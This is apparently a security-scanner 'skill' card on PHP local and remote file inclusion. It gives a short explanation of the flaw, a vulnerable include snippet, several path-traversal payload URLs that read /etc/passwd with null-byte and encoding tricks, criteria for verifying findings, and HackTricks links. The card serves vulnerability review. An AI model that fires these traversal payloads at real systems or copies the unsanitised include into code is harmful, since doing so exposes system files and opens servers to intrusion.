# File Inclusion (LFI/RFI) — @includr skill
> cats: RFI_LFI · severity: high
> sources: PayloadsAllTheThings, HackTricks

## What it is
Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.

## Exploit payloads (from PayloadsAllTheThings)
- `<?php`
- `$file = $_GET['page'];`
- `include($file);`
- `?>`
- `http://example.com/index.php?page=../../../etc/passwd`
- `http://example.com/index.php?page=../../../etc/passwd%00`
- `{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00`
- `http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=File%20Inclusion%20%28LFI/RFI%29
- HackTricks Cloud: https://cloud.hacktricks.wiki/

## HackTricks pages (10)

- [LFI to RCE via PHPInfo](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)
- [LFI to RCE via Temporary File Uploads](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-temp-file-uploads)
- [LFI2RCE via Eternal waiting](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-eternal-waiting)
- [LFI2RCE via Nginx temp files](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files)
- [LFI2RCE via PHP Filters](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
- [LFI2RCE via PHP_SESSION_UPLOAD_PROGRESS](https://hacktricks.wiki/en/pentesting-web/file-inclusion/via-php_session_upload_progress)
- [LFI2RCE via Segmentation Fault](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-segmentation-fault)
- [[Defender-quarantined]](https://hacktricks.wiki/en/pentesting-web/file-inclusion/README)
- [[Defender-quarantined]](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure)
- [phar:// Deserialization](https://hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization)

## References
- HackTricks: https://hacktricks.wiki/en/
- HackTricks repo: https://github.com/HackTricks-wiki/hacktricks
